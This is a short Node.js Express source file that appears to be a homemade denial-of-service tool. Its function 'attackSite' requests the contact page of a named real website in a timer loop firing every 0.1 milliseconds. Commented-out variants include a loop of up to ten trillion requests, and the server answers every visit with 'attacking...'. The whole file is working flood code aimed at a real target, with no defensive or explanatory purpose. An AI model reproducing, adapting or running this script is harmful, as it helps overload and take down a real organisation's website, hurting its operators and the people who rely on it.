const express=require("express")
const app=express()
app.use(express.json())





let numberofRequest=10000000000000
const fetch=require("isomorphic-fetch")
var index=0
const attackSite=async()=>{
    console.log("fetch_time: ",index++ )
    try {
       
    const response=  await fetch("https://ipobontario.ca/contact-us/") 
     const result=await response.text()
     console.log(result)
    } catch (error) {
     console.log(error.message)   
    }
}



//  setInterval(async()=>{
//     attackSite()
// },0.1)

setInterval(async()=>{
    attackSite()
},0.1)


// for(let index=0; index <numberofRequest; index++){

//  async()=>attackSite()
// }

// (async()=>{
//   attackSite()
// })()






app.use("/",(req,res)=>res.json({error:false,result:"attacking..."}))

const port=process.env.PORT||3000
app.listen(port,async()=>{console.log("running")})